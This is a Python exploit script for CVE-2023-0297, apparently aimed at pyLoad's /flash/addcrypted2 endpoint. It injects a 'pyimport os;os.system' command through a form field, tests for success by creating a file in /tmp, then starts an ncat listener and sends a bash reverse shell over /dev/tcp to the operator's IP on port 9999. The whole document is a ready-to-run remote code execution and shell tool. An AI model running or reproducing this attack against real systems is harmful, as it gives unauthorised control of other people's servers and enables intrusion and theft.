import requests
import argparse
import urllib.parse

def Exp(url:str, payload:str):
    url = f"{url}/flash/addcrypted2"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "147"
    }
    data = f'jk=pyimport%20os;os.system("{payload}");f=function%20f2(){{}};&package=xxx&crypted=AAAA&&passwords=aaaa'
    # print(data)
    response = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
    return response

def Reverse_shell()->None:
    import os 
    os.system("ncat -lvnp 9999")

def Poc(response_status:int, response_text:str)->bool:
    check = "Could not decrypt key"
    if response_status == 500 and check in response_text:
        print("[+] Target is vulnerable!")
        return True
    else:
        print("[+] Target is not vulnerable!")
        return False
if __name__ == "__main__":
    arg = argparse.ArgumentParser(usage="python3 CVE-2023-0297-Exp.py -u http://127.0.0.1:8888 -r -i 10.10.16.19")
    arg.add_argument("-u","--url",dest="url",help="Target url.")
    arg.add_argument("-r","--reverse-shell",dest="reverse",action="store_true",help="Reverse Shell?")
    arg.add_argument("-i","--ip",dest="ip",help="Your ip address.")
    args = arg.parse_args()
    if args.url == None:
        import sys
        arg.print_help()
        sys.exit(1)
    print(f"[+] Target:{args.url}")
    print(f"Check if {args.url} is vulnerable to CVE-2023-0297...")
    response = Exp(args.url, "touch%20/tmp/success")
    if Poc(response.status_code,response.text) and args.reverse:
        from threading import Thread
        rshell = Thread(target=Reverse_shell)
        rshell.start()
        from time import sleep
        sleep(2)
        payload = f"bash -c 'bash -i >& /dev/tcp/{args.ip}/9999 0>&1'"
        encode_payload = urllib.parse.quote(payload)
        #忽略异常
        #这个请求会超时报错，虽然不影响结果但是影响美观
        try:
            Exp(args.url,encode_payload)
        except:
            pass
    